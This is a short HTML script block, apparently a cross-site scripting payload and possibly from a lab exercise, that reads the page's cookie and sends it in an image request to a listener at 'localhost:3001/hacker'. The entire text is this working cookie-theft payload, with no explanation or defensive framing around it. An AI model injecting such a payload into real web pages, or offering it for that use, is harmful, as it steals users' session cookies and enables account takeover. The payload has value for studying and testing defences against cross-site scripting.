<script>
  var cookie = document.cookie.split("=")[1];
  var image = document.createElement('img');
  image.src= "http://localhost:3001/hacker?cookie=" + cookie;
  document.getElementsByTagName("body")[0].appendChild(image);
</script>